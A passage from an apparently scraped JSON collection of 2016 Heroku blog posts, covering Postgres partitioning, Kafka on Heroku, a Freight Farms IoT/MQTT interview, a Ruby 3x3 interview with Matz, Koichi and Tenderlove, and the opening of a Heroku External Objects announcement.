ahead and consider your usage patterns. So long as you take these factors into account, table partitioning can create very real performance gains for your queries and your application. Extending Your Postgres Installation In situations where you have high volumes of data that has a very short shelf life, days, weeks or even months, table partitioning can make lots of sense. As always, make sure you ask how you’re going to query your data now and into the future. Table partitioning won’t handle everything for you but it will at least allow you to extend the life of your Heroku Postgres installation. If you’re using pg_partman, we’d love to hear about it. Email us at postgres@heroku.com or via Twitter @heroku . postgres", "date": "2016-09-13,"},
{"website": "Heroku", "title": "Apache Kafka on Heroku is Now Generally Available", "author": ["Rand Fitzpatrick"], "link": "https://blog.heroku.com/kafka-on-heroku-generally-available", "abstract": "Apache Kafka on Heroku is Now Generally Available Posted by Rand Fitzpatrick September 28, 2016 Listen to this article Many of the compelling and engaging application experiences we enjoy every day are powered by event-based systems; requesting a ride and watching its progress, communicating with a friend or large group in real time, or connecting our increasingly intelligent devices to our phones and each other. Behind the scenes, similar architectures let developers connect separate services into single systems, or process huge data streams to generate real-time insights.  Together, these event-driven architectures and systems are quickly becoming a powerful complement to the relational database and app server models that have been at the core of Internet applications for over twenty years. At Heroku, we want to make the power of this increasingly important model available to a broader range of developers, allowing them to build evented applications without the cost and complexity of managing infrastructure services.  Today we are making a big step towards that goal with the general availability of Apache Kafka on Heroku .  Kafka is the industry-leading open source solution for delivering data-intensive applications and managing event streams, and is backed by an active open source community and ecosystem. By combining the innovation of the Kafka community with Heroku’s developer experience and operational expertise, we hope to make this compelling technology even more vibrant and widely adopted, and to enable entirely new use cases and capabilities. Introducing Apache Kafka on Heroku Heroku’s fully managed offering provides all the power, resilience, and scalability of Kafka without the complexity and challenges of operating your own clusters. Here at Heroku, it has been a critical part of our success in delivering fast data processing pipelines for our platform metrics , in creating a robust event stream for our API , and in unifying many of our systems and sources of data. In the ecosystem at large, Kafka has been instrumental to the successful scaling of platforms like LinkedIn, Uber, Pinterest, Netflix, and Square. Creating your Kafka clusters is as simple as adding the service to a Heroku app: heroku addons:create heroku-kafka -a sushi-app Features of Kafka on Heroku include: Automated Operations :  Apache Kafka is a complex, multi-node distributed system, providing power but requiring significant operational care and feeding.  With Kafka on Heroku, all of those operational burdens disappear - like other Heroku data services such as Postgres, everything from provisioning, management, and availability is handled automatically.  Adding Kafka to your application is now as simple as a single command line. Simplified Configuration : Optimizing Kafka configuration and resourcing for different applications and use cases is often an art unto itself.  Apache Kafka on Heroku offers a set of preconfigured plan options tested and optimized for the most common use cases.  Available in both the Common Runtime and within Heroku Private Spaces, Kafka on Heroku can be provisioned with the  security and level of network isolation that meets your application needs. Service Resiliency, Upgrades, and Regions : One of the more powerful capabilities of Apache Kafka on Heroku is the self healing and automated recovery the service provides; if a broker becomes unavailable, the service will automatically replace and re-establish failed elements of the cluster. In addition, Kafka on Heroku clusters can be upgraded in place with no downtime all the way up to multi-terabyte scale. Like other Heroku data services offered in Private Spaces, Kafka on Heroku is available in different regions and geographies, including both east and west coast United States, Dublin, Germany, Japan and Sydney. Dashboard and Developer Experience :  At the core of Apache Kafka on Heroku is a simple provisioning and management experience that fits seamlessly into the rest of the Heroku platform. In addition to a robust set of CLI commands and options, a new Dashboard provides both visibility into the utilization and behavior of a given Kafka cluster, as well as a simple configuration and management UI. The plans now available are dedicated clusters, optimized for high throughput and high volume. We will continue to extend this range of plans to cover a broader set of needs, and to make evented architectures available to developers of all stripes. Kafka and Event Architectures Events are everywhere in modern application development, and they are becoming increasingly important. They’re the lifeblood of everything from activity streams, and IoT devices, to mobile apps, and change data capture. Leveraging these event streams  is more important than ever, but doing so requires employing a new set of concepts. Traditional data architectures focused on transactions and remote procedure calls. These approaches are relatively easy to reason about at certain levels of scale. As systems scale, deal with intense data throughput, and integrate diverse services, developers find that there are very real limits to the transactional and service to service models. Kafka handles event streams with ease, and provides a solid foundation for designing the logic of your data flows, unifying various data systems, and enabling real-time processing. Kafka also delivers a small but elegant set of abstractions to help developers understand critical facets of event-driven systems like event delivery, ordering, and throughput. Kafka enables you to easily design and implement architectures for many important use cases, such as: Elastic Queuing Kafka makes it easy for systems to accept large volumes of inbound events without putting volatile scaling demands on downstream services.These downstream services can pull from event streams in Kafka when they have capacity, instead of being reactive to the “push” of events. This improves scaling, handling fluctuations in load, and general stability. Data Pipelines & Analytics Applications at scale often need analytics or ETL pipelines to get the most value from their data. Kafka’s immutable event streams enable developers to build highly parallel data pipelines for transforming and aggregating data. This means that developers can achieve much faster and more stable data pipelines than would have been possible with batch systems or mutable data. Microservice Coordination Many applications move to microservice style architectures as they scale, and run up against the challenges that microservices entail: service discovery, dependencies and ordering of service availability, and service interaction. Applications that use Kafka for communication between services can simplify these design concerns dramatically. Kafka makes it easy for a service to bootstrap into the microservice network, and discover which Kafka topics to send and receive messages on. Ordering and dependency challenges are reduced, and topic based coordination lowers the overhead of service discovery when messages between services are durably managed in Kafka. Get Started with Kafka Today Apache Kafka on Heroku is available in all of Heroku’s runtimes, including Private Spaces . Again, to get started, provision Kafka from Heroku Elements or via the command line.  We are excited to see what you build with Kafka! If you have any questions or feedback, please let us know at kafka@heroku.com or attend our technical session on Nov 3rd to see a demo and get your questions answered! kafka events streams data", "date": "2016-09-28,"},
{"website": "Heroku", "title": "Powering the real food revolution with IoT, MQTT, and Heroku: an Interview with Freight Farms", "author": ["Chris Castle"], "link": "https://blog.heroku.com/freight-farms-on-heroku", "abstract": "Powering the real food revolution with IoT, MQTT, and Heroku: an Interview with Freight Farms Posted by Chris Castle October 13, 2016 Listen to this article Kyle Seaman is Director of Farm Technology for Freight Farms, producer of pre-assembled, IoT-enabled, hydroponic farms inside repurposed freight containers. Read the Freight Farms customer story to learn more about how Heroku has helped the company scale their business. What is Freight Farms? Our flagship product, The Leafy Green Machine (LGM), is a complete, commercial-ready, hydroponic growing system assembled inside a repurposed shipping container. Each of our 100+ farms is connected to an IoT network built on Heroku. Tell us about your stack. We’re running the open source version of the Parse server on Heroku .  Our stack is mostly JavaScript: MongoDB along with a Node.js API.  We also use Heroku Postgres . Xively is a core component of our stack. We use the Xively add-on to sync our Heroku apps with their IoT cloud platform enabling  us to connect the physical sensors and gateway devices located in our individual farm units to our software system running on Heroku. Our favorite Heroku Add-on is Papertrail , which has been great with helping us monitor our apps. Heroku Connect has also made it really easy to sync data with our Salesforce CRM instance. Our customer-facing app, Farmhand, is a native iOS and React web app. Farmhand's Connect features enable farmers to track, monitor, and control the climate and growing conditions of their farm remotely. Farmhand’s Shop is an e-commerce app where farmers can buy supplies. How does data flow through your hardware and software systems? Every farm is provisioned with a gateway device that’s running a Xively MQTT client locally. It’s connected to the other hardware devices, such as IP security cameras, wireless sensors, and the farm’s automation controller.  Xively serves as our MQTT communication gateway and broker. Every minute, the gateway is collecting 100+ data points that give us information about the farm environment. This ranges from simple data, such as whether the lights are on or off, to more complex readings of nutrient levels, CO2, and temperature. The local MQTT client running in each shipping container is a Lua application.  It connects each farm to Xively’s cloud MQTT broker. This means that any other client can subscribe to listen in. As data is being passed up to the MQTT cloud broker, our server on Heroku is listening so it can process that data in real-time. The IoT communication gateway and time series tracking is provided by Xively, and the logic is happening on Heroku. As a farm sends out data, Xively can respond to time series queries and Heroku filters the data to check for issues. Do you communicate the other way, from your server to the farm? Yes, we do.  Our Heroku app has a range of workflows and monitoring triggers, that when triggered, sends a command via MQTT down to the farm. The local client is also listening for messages from the Heroku side. There are also endpoints that allow our farmers to control the farm remotely. When farmers sign in to the Farmhand app and want to do something like turn the lights on, a Heroku app handles that request. It sends a message to the farm over MQTT, which then routes it to the farm’s automation controller to initiate the action. What is the advantage to using MQTT? In general, this MQTT architecture has worked really well for us. We were originally using HTTPS and a Raspberry Pi for sending data from the farm, but we’ve upgraded to a proper gateway, which gives us better security and enables sending data to the farm. Because MQTT is such a strong IoT standard now, it was very straightforward to configure our one-way HTTPS infrastructure for two way TLS MQTT. With MQTT, you have one broker and n number of clients. Each new message only needs to be sent over the wire from the farm once, but will end up on all connected clients and our server instantly. This both saves on bandwidth and scales well as we bring more farms and client apps online. MQTT is built around the concept of channels (ex. /sensors ), and each client can subscribe to and extend channels (ex. /sensors/{farmId} ). Xively has extended MQTT in an interesting way with the concept of templates. They don’t just have a /sensor channel that every device or client can subscribe to. Instead, every farm has its own set of channels built from the template, e.g. /{farmId}/sensors . As new channels are created, they are propagated to all devices.  This adds a nice layer of security and separation, ensuring that messages only get to the intended device.  From a development standpoint, it makes it that much easier to work with the protocol as each device shares the same properties. Xively also adds the concept of organizations, allowing only clients and devices in the same organization to actually send messages to each other.  This added logic on the broker means there is nothing extra for us to do to get full ACL out of the box. Our message volume is very high. Each new request, such as “calibrate sensors,” initiates a specific session that subscribes to a farm channel. So if I create a new channel for a calibration, it will propagate to every device on every farm, making it a lot easier for us. MQTT can be challenging in a multi-dyno setup, how are you using it? Generically subscribing to a topic on Heroku is challenging, as each dyno will receive the message at the same time.  However, sending messages from a running process over MQTT using WebSockets works really well, and that’s how we are using it. We have a number of workflows and monitoring triggers that start up a process on Heroku, this could be a farmer hitting “start calibration” on their mobile app, or the server automatically stopping a pump once the tank is full.  For user workflows, when one is started,  the Farmhand app is listening to our server on Heroku, and the server uses MQTT to start a session subscribing to that farm’s specific channel for the workflow. This actually allows us to do less filtering on all inbound message because the server process and app subscribe to the actual topic URL associated with that farm. Interestingly, we’ve found it faster to do tasks such as calibration through our cloud-based system rather than locally using a PLC (Programmable Logic Controller) for the farm. Can you tell us more about the hardware and sensors? Each farm has 40 pieces of environmental equipment that are controlled by an automation controller that uses the modbus protocol. These pieces of equipment are for anything climate-related or mechanical, such as lights, pumps, and fans. Every time a piece of equipment changes state,  (e.g. “the pump turned off?”),  we send this info up through the gateway to our server. At any point, Heroku or a client app can send the appropriate command down to the hardware, (e.g. “lights turn off”). Each farm has 10 sensors. Some track climate-related conditions, such as humidity, CO2, and temperature. Others track conditions in our growing tanks, such as nutrients or pH levels in the water. Do you push firmware updates? Our very first farm that started 4 years ago is still running the same automation controller, which didn’t ship with OTA firmware updates.  So a big consideration as we deployed our Heroku / Xively infrastructure was backwards compatibility.  Our gateway has solved this issue, it augments the existing controller and it’s able to update itself with all our newer features through server-side logic. That’s a big evolution for our company—extending functionality to push firmware updates remotely, without requiring the user to do them manually onsite. So, instead of having to go onsite to a farm to update firmware or fine-tune hardware, we can optimize the farm from anywhere through our app. We can also learn from optimizing a single farm and apply it to other farms and crops. How are you applying what you’ve learned? Because we can access any or all of our farms on demand, we’re building out new workflows that help us optimize farm operations based on real usage data. We’ve written monitoring logic on Heroku to handle scenario and location-specific conditions. For example, if a farm is located in a cool climate region, we control the farm’s internal temperature by cooling it via the intake fans rather than AC in order to save energy. Our next area of opportunity is crop optimization. For example, if you’re growing basil, what are the right conditions that will produce the best crop in your area? We’re starting to analyze yield data, but it’s still a very manual process. The new Track feature in  Farmhand just launched a couple of weeks ago, which will help aggregate and analyze data from all our farms. Once we have historical data and algorithms in place, we’ll be able to strengthen our growing parameters for specific crops, as well as trigger alerts to farmers if conditions are suboptimal. We’re finally hitting scale with 100 farms deployed. Many of these farms are just coming online, so we’re just getting the data now to validate some of these ideal “growing recipes.” What’s next for Freight Farms? We’re in a “consume and learn” phase. The next big project will be exposing this data through Farmhand analysis tools to help our farmers continue to grow the best product possible. We’ve also just launched our newest product, the LGC, which is our most connected farm yet, and ¼ the size of the LGM.  As we continue down the connected path, we’ll continue to discover new and exciting use cases for our farms that weren’t possible before. Xively IoT MQTT Freight Farms Modbus", "date": "2016-10-13,"},
{"website": "Heroku", "title": "Ruby 3x3: Matz, Koichi, and Tenderlove on the future of Ruby Performance", "author": ["Jonan Scheffler"], "link": "https://blog.heroku.com/ruby-3-by-3", "abstract": "Ruby 3x3: Matz, Koichi, and Tenderlove on the future of Ruby Performance Posted by Jonan Scheffler November 10, 2016 Listen to this article At RubyKaigi I caught up with Matz , Koichi , and Aaron Patterson aka Tenderlove to talk about Ruby 3x3 and our path so far to reach that goal. We discussed Koichi’s guild proposal, just-in-time compilation and the future of Ruby performance. Jonan: Welcome everyone. Today we are doing an interview to talk about new features coming in Ruby 3. I am here with my coworkers from Heroku, Sasada Koichi and Yukihiro Matsumoto, along with Aaron Patterson from GitHub. Jonan: So, last year at RubyKaigi you announced an initiative to speed up Ruby by three times by the release of version three. Tell us more about Ruby 3x3. Matz: In the design of the Ruby language we have been primarily focused on productivity and the joy of programming. As a result, Ruby was too slow, because we focused on run-time efficiency, so we’ve tried to do many things to make Ruby faster. For example the engine in Ruby 1.8 was very slow, it was written by me. Then Koichi came in and we replaced the virtual machine. The new virtual machine runs many times faster. Ruby and the Ruby community have continued to grow, and some people still complain about the performance. So we are trying to do new things to boost the performance of the virtual machine.  Even though we are an open source project and not a business, I felt it was important for us to set some kind of goal, so I named it Ruby 3x3. The goal is to make Ruby 3 run three times faster as compared to Ruby 2.0. Other languages, for example Java, use the JIT technique, just in time compilation; we don't use that yet in Ruby. So by using that kind of technology and with some other improvements, I think we can accomplish the three times boost. Aaron: So it’s called Ruby 3x3, three times three is nine and JRuby is at nine thousand. Should we just use JRuby? Jonan: Maybe we should. So Ruby 3x3 will be three times faster. How are you measuring your progress towards that goal? How do we know? How do you check that? Matz: Yes, that's an important point. So in the Ruby 3x3 project, we are comparing the speed of Ruby 3.0 with the speed of Ruby 2.0. We have completed many performance improvements in Ruby 2.1 and 2.3, so we want to include that effort in Ruby 3x3. The baseline is Ruby 2.0. This is the classification. Aaron: So your Rails app will not likely be three times faster on Ruby 3? Matz: Yeah. Our simple micro-benchmark may run three times faster but we are worried that a real-world application may be slower, it could happen. So we are going to set up some benchmarks to measure Ruby 3x3. We will measure our progress towards this three times goal using those benchmark suites. We haven't set them all up yet but they likely include at least optcarrot (an NES emulator) and some small Rails applications, because Rails is the major application framework for the Ruby language. We’ll include several other types of benchmarks as well. So we have to set that up, we are going to set up the benchmark suites. Jonan: So, Koichi recently made some changes to GC in Ruby.We now use a generational garbage collector. Beyond the improvements that have been made already to GC, what possibility is there for more improvement that could get us closer to Ruby 3x3? Do you think the GC changes are going to be part of our progress there? Koichi: As Matz says Ruby’s GC is an important program, it has a huge overhead. However, the recent generational garbage collector I don't think has nearly as much overhead. Maybe only ten percent of Ruby’s time is spent in GC, or something like that. If we can speed up garbage collection an additional ten times, it's still only ten percent of the overall time. So sure we should do more for garbage collection, but we have lots of other more impactful ideas. If we have time and specific requests for GC changes, we will certainly consider those. Aaron: … and resources... Koichi: Yes. Aaron: The problem is, since, for us at GitHub we do out-of-band garbage collections, garbage collection time makes no difference on the performance of the requests anyway. So even if garbage collection time is only ten percent of the program and we reduce that to zero, say garbage collection takes no time at all, that's not three times faster so we wouldn't make our goal anyway. So, maybe, GC isn't a good place to focus for the Ruby 3x3 improvements. Matz: Yeah we have already added the generational garbage collector and incremental garbage collection. So in some cases, some applications, large web applications for example, may no longer need to do that out-of-band garbage collection. Aaron: Yeah, I think the only reason we are doing it is because we are running Ruby 2.1 in production but we're actually on the path to upgrading. We did a lot of work to get us to a point where we could update to Ruby 2.3, it may be in production already. My team and I did the work, somebody else is doing the deployment of it, so I am not sure if it is in production yet but we may soon be able to get rid of out-of-band collection anyway. Matz: Yes in my friend's site, out-of-band collection wasn’t necessary after the deployment of Ruby 2.3. Jonan: So the GC situation right now is that GC is only maybe about ten percent of the time it takes to run any Ruby program anyway. So, even if we cut that time by half, we're not going to win that much progress. Matz: It's no longer a bottleneck so the priority is lower now. Jonan: At RailsConf, Aaron talked about memory and memory fragmentation in Ruby. If I remember correctly it looked to me like we were defragging memory, which is addressed, so in my understanding that means that we just point to it by the address; we don't need to put those pieces of memory close together. I'm sure there's a reason we we might want to do that; maybe you can explain it Aaron. Aaron: Sure. So, one of the issues that we had at, well, we have this issue at GitHub too, is that our heap gets fragmented. We use forking processes, our web server forks, and eventually it means that all of the memory pages get copied out at some point. This is due to fragmentation. When you have a fragmented heap, when we allocate objects, we are allocating into those free slots and so since we're doing writes into those slots, it will copy those pages to child processes. So, what would be nice, is if we could eliminate that fragmentation or reduce the fragmentation and maybe we wouldn't copy the child pages so much. Doing that, reducing the fragmentation like that, can improve locality but not necessarily. If it does, if you are able to improve the locality by storing those objects close to each other in memory, they will be able to hit caches more easily. If they hit those caches, you get faster access, but you can't predict that. That may or may not be a thing, and it definitely won't get us to Ruby 3x3. Jonan: Alright. Matz: Do you have any proof on this? Or a plan? Aaron: Any plan? Well yes, I prepared a patch that... Matz: Making it easier to separate the heap. Aaron: Yes, two separate heaps. For example with classes or whatever types with classes, we’ll allocate them into a separate heap, because we know that classes are probably not going to get garbage collected so we can put those into a specific location. Koichi: Do you have plans to use threads at GitHub? Aaron: Do I have plans to use threads at GitHub? Honestly, I don't know. I doubt it. Probably not. We'll probably continue to use unicorn in production. Well I mean we could but I don't see why. I mean we're working pretty well and we're pretty happy using unicorn in production so I don't think we would switch. Honestly, I like the presentation that you gave about guilds, if we could use a web server based on guilds, that would be, in my opinion, the best way. Matz: Yes, I think it's promising. Jonan: So these guilds you mentioned (Koichi spoke about guilds at RubyKaigi ), maybe now is a good time to discuss that. Do you want to tell us about guilds? What they are and how that affect plans for Ruby 3x3? Matz: We have three major goals in Ruby 3. One of them is performance, which is that our program is really running three times faster. The second goal is the concurrency model, which is implemented by something like Ruby guilds. Koichi: So concurrency and parallelism utilize some CPU cores. Matz: Yeah, I say concurrency just because the guild is the concurrency model from the programmer's view. Implementation-wise it should be parallelism. Koichi: I'm asking about the motivation of the concurrency. Matz: Motivation of the concurrency? Koichi: Not only the performance but also the model. Matz: Well we already have threads. Threads are mostly ok but it doesn't run parallel, due to the existing GIL. So guilds are a performance optimization. Concurrency by guilds may make the threading program or the concurrency runtime program faster, but the main topic is the data abstraction for concurrent projects. Jonan: OK. So while we are on the topic of threads I am curious. I've heard people talk about how it might be valuable to have a higher level of abstraction on top of threads because threads are quite difficult to use safely. Have you all thought about adding something in addition to threads that maybe protects us from ourselves a little bit around some of those problems? Is that what guilds are? Aaron: Yes, that's essentially what the guild is, it's a higher level abstraction so you can do parallel programming safely versus threads where it's not safe at all. It's just... Koichi: Yes, so it's a problem with concurrency in Ruby now; sharing mutable objects between threads. The idea of guilds, the abstraction more than guilds specifically, is to prohibit sharing of mutable objects. Jonan: So when I create an object how would I get it into a guild? If I understand correctly, you have two guilds - A and B - and they both contain mutable objects. With the objects in A, you could run a thread that used only those objects, and run a different thread that used only objects in B, and then you would eliminate this problem and that's why guilds will exist. But how do I put my objects into guilds or move them between guilds? Have you thought about it that far yet? Matz: Yeah, a guild is like some kind of bin, a container with objects. With it, you cannot access the objects inside the guild from outside, because the objects are members of the guild. However, you can transfer the objects from one guild to another. So, by transferring, the new objects can be accessed in the destination guild. Jonan: I see, OK. So the objects that are in a guild can't be accessed from outside that guild; other guilds can't get access to them. Then immutable objects are not members of guilds. They are outside. Koichi: So immutable objects are something like freelance objects. Freelance objects are immutable, so any guild can access them because there are no read-write conflicts. Jonan: So you would just use pointers to point to those immutable objects? Koichi: Yes. Also, I want to note that immutable doesn't mean frozen object. Frozen objects can contain mutable objects. So I mean those immutable objects which only contain children that point to immutable objects. Jonan: So if we had a nested hash, some large data structure, we would need to freeze every object in that in order to reference it this way. Is there a facility in Ruby right now to do that? I think I would have to iterate over that structure freezing objects manually today. Matz: Not yet. Jonan: So there might be? Matz: We need to provide something to freeze these objects. Aaron: A deep freeze. Matz: Yes, deep freeze. Jonan: Deep Freeze is the name of this feature maybe? I think that would be an excellent name for it. Aaron: I like deep freeze. (Koichi would like to note that the name for this feature has not yet been determined) Jonan: I think you mentioned it earlier but maybe you could tell us a little more about just in time compilation, the JIT, and how we might approach that in Ruby 3. Matz: The JIT is a pretty attractive technology for gaining performance. You know, as part of the Ruby 3x3 effort we are probably going to introduce some kind of JIT. Many other virtual machines have introduced the LLVM JIT. However, personally, I don't want to use the LLVM JIT for Ruby 3, just because the LLVM itself is a huge project, and it's much younger than Ruby. Ruby is more than twenty years old. It's possibly going to live for twenty more years, or even longer, so relying on other huge projects is kind of dangerous. Aaron: What do you think of Shyouhei’s stuff? Matz: The optimizer? Aaron: Yeah. Matz: Yeah, it's quite interesting, but its application is kind of limited. We have to measure it. Koichi: I think Shyouhei’s project is a good first step, but we need more time to consider it. Jonan: Can you explain what it is? Aaron: Yeah, so Shouhei, what he did was he... Matz: De-optimization. Aaron: Yeah he introduced a de-optimization framework that essentially lets us copy old instructions, or de-optimized instructions, into the existing instruction sequences. So he can optimize instructions and if anything happens that would… well, I guess I should step back a little bit.  So if you write, in Ruby, 2 + 4 , typically the plus operator is not overwritten. So if you can make that assumption then maybe we can collapse that down and replace it with just six. Right? Jonan: I see. Aaron: But if somebody were to override the plus method, we would have to not do that class because we wouldn't know what the plus does. And in order to do that, we have to de-optimize and go back to the original instructions that we had before. So, what Shouhei did was he introduced this de-optimization framework. It would allow us to take those old instructions and copy them back in, in case someone were to do something like what I described, overriding plus. Matz: JRuby people implement very nice de-optimization technologies. They made just such a de-optimization framework on the Java Virtual Machine, so on this topic at least they are a bit ahead of us. Aaron: Well the one thing, the other thing that I don't know; if you watch the JRuby or JRuby Plus Truffle stuff, if you read any of the papers about it, there are tradeoffs, the JIT isn't free. I mean we have to take into consideration how much memory usage that will require. People hearing this shouldn't think \"oh well let's just add a JIT that's all we have to do and then it will be done\". It’s much harder, there are more tradeoffs than just simply add a JIT. Jonan: Yes. So there was an older implementation, RuJIT, the Ruby JIT, but RuJIT had some memory issues didn't it? Koichi: Yes, quite severe. It needed a lot of memory. Such memory consumption is controllable, however, so we can configure how much memory they can use. Jonan: OK, so you just set a limit for how much the JIT uses and then it would do the best it could with what you had given it, basically? Koichi: Yeah. Jonan: OK. Koichi: RuJIT can improve the performance of micro-benchmarks but I’m not sure about the performance in larger applications. Jonan: So, for Rails applications maybe we should call it \"Ruby 1.2x3\" or something. Aaron: I think that's an interesting question to bring up because if a Rails application is part of the  base benchmarks, are we really going to make a Rails application three times faster? Matz: We need to make our performance number calculations pretty soon. This is a big problem I think. So maybe some kind of operation such as concatenating... Aaron: Concatenation, yeah. Matz: … or temporary variable creation or something like that, we can improve the performance. Aaron: So, I think it's interesting if we come up with a benchmark that's using string concatenation. I mean we could use an implementation for that. For example, what if we used ropes instead. If we did that, maybe string concatenation would become very fast, but we didn't really improve the virtual machine at all, right? So, how do we balance, does that make sense? How do we balance those things? Matz: So unlike the typical application, the language can be applied anywhere, so it can be used to write Rails applications, or science applications, or games, so I don't think improving that one thing will necessarily change that situation. So we have to do everything, maybe introducing ropes, introducing a JIT in some form, introducing some other mechanisms as well to see that improvement. We have to do it. Aaron: So maybe the key is in the benchmarks that we have. We have something doing a lot of string concatenations, something doing a lot of math, maybe something doing, I don't know, I/O. Something like that? Matz: Yeah. We have to. We cannot be measured by one single application, we need several. Aaron: Right. Matz: And then in the Rails application we have to avoid the database access. Just because, you know, access to the database is slow, can be very slow. That we cannot improve. Jonan: So, along with the JIT, you've also talked about some type changes to coming to Ruby 3 and the optional static types. Can you tell us about that? Matz: Yeah, the third major goal of the Ruby 3 is adding some kind of static typing while keeping the duck typing, so some kind of structure for soft-typing or something like that. The main goal of the type system is to detect errors early. So adding this kind of static type check or type interfaces does not affect runtime. Matz: It’s just a compile time check. Maybe you can use that kind of information in IDEs so that the editors can use that data for their code completion or something like that, but not for performance improvement. Aaron: You missed out on a really good opportunity for a pun. Jonan: Did I? What was the pun? Aaron: You should have said, \"What type of changes will those be?\" Jonan: What type of type changes would those be? Yes. I've been one-upped once again, by pun-master Aaron here. Aaron: I was holding it in, I really wanted to say something. Jonan: You looked up there suddenly and I thought, did I move on too early from the JIT discussion? No, it was a pun. That was the pun alert face that happened there, good. I'm sorry that we missed the pun. So, to summarize then, the static type system is not something that will necessarily improve performance... Koichi: Yes. Jonan: ...but it would be an optional static type system, and it would allow you to check some things before you're running your program and actually running into errors. Matz: Yeah, and if you catch those errors early you can improve your productivity. Jonan: Yes, developer productivity. Matz: Yeah. Jonan: Which is, of course, the primary goal of Ruby, or developer happiness rather, not necessarily productivity. So, the JIT, this just in time compiler, right now Ruby has ahead of time compilation (AOT) optionally?  There's some kind of AOT stuff that you can do in Ruby? Matz: I don't code with it. Aaron: “Some, kind of”. Jonan: OK. Aaron: It has a framework built in to allow you to build your own AOT compiler. It has the tools in there to let you build an AOT compiler, and I think you wrote a gem, the... Koichi: Yeah, Yomikomu . Aaron: Yeah. Jonan: OK. Yomikomu is an AOT compiler for Ruby. Can you describe just a little bit what that means? What ahead of time compilation would mean in this case? What does it do? Koichi: Ruby compiles at runtime, so we could store the compiled binary to the file system or something, some database or somewhere. The Yomikomu gem uses this feature, writing out instruction sequences to the file system at runtime, so we can skip the compiler tool in the future. It’s only a small improvement, I think, maybe 30%. Aaron: 30%? Matz: 30% is huge. Aaron: Yeah! Jonan: That seems like a pretty good improvement to me. Koichi: I do think so. Aaron: We just need a few more 30% improvements then Ruby 3x3 is done. Matz: Yeah, that means 30% of the time is spent in the compiler. Koichi: Yeah, in 2.3. Matz: That’s huge! Aaron: That's what I said! Jonan: So, rather than JIT, have you thought about maybe like a little too late compiler? We could just compile after the program runs and we don't need to compile it all then. Maybe wouldn’t be as popular as a just in time compiler. Aaron: One thing I think would be interesting, one thing that I'd like to try someday, is to take the bytecode that's been written out and analyze it. So we could know for example that we can use this trick that Shyouhei’s doing with constant folding. Since we have all of the bytecode written out, you should be able to tell by analyzing the bytecode whether or not... actually maybe you couldn't tell that. I was going to say we could analyze the bytecode and optimize it with code, rewriting an optimized version to disk. But since you can do so much stuff at runtime, I don't know if it would work in all cases. Koichi: This is exactly what the JIT or some kind of comparable approach aims to do. Aaron: Yeah. Jonan: So, cases like you were talking about earlier where this plus can be overridden in Ruby, so what you would do is assume the plus is not overridden and you would just put six, you would actually write that into the bytecode, just the result of this value. Then this framework would allow you to later, if someone did overwrite the plus method dynamically while the program was running, to swap it out again for the old implementation. Aaron: Yes. Jonan: OK. Aaron: So basically the public service announcement is: \"don't do that.\" Jonan: Don't do that. Don't override plus. Aaron: Just stop it. Jonan: Just stop it. You're going to make the Ruby team's life harder. Koichi: Yes, lots harder. Jonan: OK. Is there anything else you would like to add about Ruby 3? Anything we didn't touch on today that might be coming? Matz: You know, we’ve been working on Ruby 3 for maybe two years right now, but we are not expecting to release in a year or even two. Maybe by 2020? Aaron: Does that mean that we have to wait, are we really going to wait for Ruby 3 to introduce guilds? Or are we going to introduce that before Ruby 3? Matz: Before Ruby 3 I guess. Aaron: OK. Matz: Yeah, we still have a lot of things to do to implement guilds. Aaron: Of course. Matz: For example, the garbage collection is pretty difficult. The isolated threads can't access the same objects in that space, so it will be very difficult to implement garbage collection. I think we’ve had a lot of issues with that in the past, so that could take years. But if we’re done, we are happy to introduce guilds into maybe Ruby 2... 6?. Aaron: 2.6, yeah. Matz: So this is because we don't want to break compatibility. So if a program isn’t using guilds it should run the same way. Jonan: So this is how we are able to use immutable objects in Ruby, but they’re frozen objects. They can’t be unfrozen. Matz: No. Jonan: OK. Koichi: Freezing is a one-way operation. Aaron: Yes. Jonan: OK. So then, a friend asked me when I described guilds, he writes a lot of Haskell, he asked me when we are we going to have \"real immutable objects\", and I don't quite know what he means. Is there some distinction between an immutable object in Ruby and an immutable object in a different language that’s important? Matz: For example in Haskell, everything is immutable, it’s that kind of language, everything is immutable from day one. Jonan: Yes. Matz: But in Ruby we have mutable objects, so under that kind of situation we need a whole new construct. Aaron: Frozen objects should really be immutable. It's really immutable. Jonan: OK. Aaron: I don't... Jonan: You don't know what this person who air-quoted me \"real immutable\" was saying? Aaron: Yeah I don't know why they would say \"real immutable\". Jonan: Should I unfriend him on Facebook? I think I'm going to after this. Matz: At least tell him if you want \"real immutable\" go ahead and use Haskell. Jonan: I think that's an excellent option, yeah. Aaron: You just to need to say to them quit \"Haskelling\" me. Jonan: I should, I’ll just tell them to quit \"Haskelling\" me about immutable objects. Well, it has been a pleasure. Thank you very much for taking the time. We've run a little bit longer than promised but I think it was very informative, so hopefully people get a lot out of it. Thank you so much for being here. ruby ruby 3x3", "date": "2016-11-10,"},
{"website": "Heroku", "title": "Now GA: Read and Write Postgres Data from Salesforce with Heroku External Objects", "author": ["Robert Zare"], "link": "https://blog.heroku.com/heroku-external-objects-support-for-writes", "abstract": "Now GA: Read and Write Postgres Data from Salesforce with Heroku External Objects Posted by Robert Zare November 15, 2016 Listen to this article Today we are announcing a significant enhancement to Heroku External Objects : write support. Salesforce users can now create, read, update, and delete records that physically reside in any Heroku Postgres database from within their Salesforce deployment. Increasingly, developers need to build applications with the sophistication and user experience of the consumer Internet, coupled with the seamless customer experience that comes from integration with Salesforce. Heroku External Objects enable a compelling set of integrations scenarios between Heroku and Salesforce deployments, allowing Postgres to be updated based on business processes or customer records in Salesforce. With Heroku External Objects, data persisted in Heroku Postgres is presented as an external object in Salesforce. External objects are similar to custom objects, except that they map to data located outside your Salesforce org, and are made available by reference at run time. Integration with Salesforce Connect Heroku External Objects is built to seamlessly integrate with Salesforce Connect using the OData 4.0 standard. Salesforce Connect enables access to data from a wide variety of external sources, in real-time, without the need to write and maintain integration code. This ‘integration by reference’ approach has a number of compelling benefits: Efficiency : Fast time to value, absence of custom integration code, and reduced storage footprint. Low Latency : Accessing external objects results in data being fetched from the external system in real time, eliminating the risk of data becoming stale over time. Flexibility : External objects in Salesforce share many of the same capabilities as custom objects such as the ability to define relationships, search, expose in lists and   chatter feeds, and support for CRUD operations. Platform Integration : External objects can be referenced in Apex, Lightning and VisualForce, and accessed via the Force.com APIs. Common Usage Patterns We have many Heroku Postgres customers with multi-terabyte databases, which are used in service to an incredibly diverse range of applications. When it comes to integrating this data with Salesforce, we tend to see two, non-exclusive integration patterns: Salesforce as source of truth and Postgres as source of truth. Salesforce as source of truth scenarios often entail updates originating from an external application to core Salesforce objects such as Orders, 